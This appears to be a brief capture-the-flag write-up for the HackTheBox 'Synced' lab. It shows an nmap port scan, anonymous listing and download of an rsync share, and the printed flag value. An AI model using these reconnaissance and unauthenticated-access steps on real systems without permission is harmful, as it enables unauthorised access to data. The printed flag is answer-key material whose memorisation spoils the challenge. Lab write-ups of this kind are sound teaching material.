# [HackTheBox] [Synced]: [Enumeratoin], [Foothold]

**Target:** [Synced] | **OS:** Linux | **Difficulty:** Super Easy
**Attack Vector:** [Enumeration -> Foothold]

---

## 1. Enumeration

```bash
sudo nmap -p- -sS --min-rate 5000 -T3 10.129.127.225
```

`PORT    STATE SERVICE
873/tcp open  rsync`

Lets investigate about `rsync` 

![Image](https://raw.githubusercontent.com/zyoel/writeups/main/htb/synced/assets/search.png)

Sp its a daemon which means a program that runs in the background, lets see what we can do with this

## 2. Foothold

```shell
➜ rsync -av --list-only rsync://10.129.127.225
public         	Anonymous Share
```

So we first began by listing the modules (shares) and we can see we have one which is `public`

```shell
➜ rsync -av --list-only rsync://10.129.127.225/public
receiving incremental file list
drwxr-xr-x          4,096 2022/10/25 00:02:23 .
-rw-r--r--             33 2022/10/24 23:32:03 flag.txt
```

And then lets grab that flag 

```shell
➜ rsync -av rsync://10.129.127.225/public ./public_dump/
receiving incremental file list
created directory ./public_dump
./
flag.txt

sent 50 bytes  received 161 bytes  24.82 bytes/sec
total size is 33  speedup is 0.16
```
## 3. Flag

```shell
➜ cd public_dump/
➜ ls
flag.txt
➜ cat flag.txt
72eaf5344ebb84908ae543a719830519
```

Pwned.
